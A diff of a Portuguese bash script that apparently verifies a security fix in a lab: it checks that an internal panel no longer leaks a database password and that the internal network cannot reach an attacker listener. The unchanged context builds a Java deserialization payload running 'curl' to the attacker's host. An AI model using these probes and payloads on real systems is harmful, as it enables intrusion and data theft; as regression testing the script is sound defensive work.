@@ -66,19 +66,23 @@ importar() {
   curl -sS -X POST "$WAF/v1/comprovantes/importar" -H "Authorization: Bearer $ana_v1" \
     -H 'Content-Type: application/json' -d "{\"url\":\"$1\"}" -w '\n%{http_code}'
 }
-painel=$(importar http://painel:8080/config)
-painel_fechado() {
-  echo "$painel" | grep -Eq '"status":40[14]|^403$' && ! echo "$painel" | grep -q "$(cat "$SEGREDOS_DIR/pgpassword")"
+# De dentro da rede interna, pelo contêiner do banco (só na interna, com o
+# wget do busybox): prova a rede e o painel sem depender do WAF, que poderia
+# barrar o pedido antes e fazer a checagem passar pelo motivo errado.
+de_dentro() { "${CORRIGIDO[@]}" exec -T banco wget -q -T 5 -O - "$@"; }
+painel_pede_token() {
+  local saida
+  saida=$(de_dentro http://painel:8080/config 2>&1 || true)
+  echo "$saida" | grep -q "401" && ! echo "$saida" | grep -q "$(cat "$SEGREDOS_DIR/pgpassword")"
 }
-verificar "pelo SSRF, o painel pede token e não tem mais /config" painel_fechado
+verificar "de dentro da rede, o painel responde 401 e não entrega segredo" painel_pede_token
 
 gateway=$(docker network inspect bridge -f '{{(index .IPAM.Config 0).Gateway}}')
 python3 infra/rede/atacante.py 9100 /dev/null "$TRABALHO/coleta-corrigido.txt" & ATACANTE=$!
 sleep 1
-saida=$(importar "http://$gateway:9100/chisel")
+sem_saida() { ! de_dentro "http://$gateway:9100/chisel" >/dev/null 2>&1; }
+verificar "a rede interna não tem saída para a máquina do atacante" sem_saida
 kill "$ATACANTE" 2>/dev/null || true
-sem_saida() { ! echo "$saida" | grep -q '"status":'; }
-verificar "a API não alcança a máquina do atacante (rede interna sem saída)" sem_saida
 
 payload=$(java -cp target/classes infra/rede/GerarPayload.java bash -c "curl http://$gateway:9100/coleta")
 status=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$WAF/v1/agendamentos" -H "Authorization: Bearer $ana_v1" \
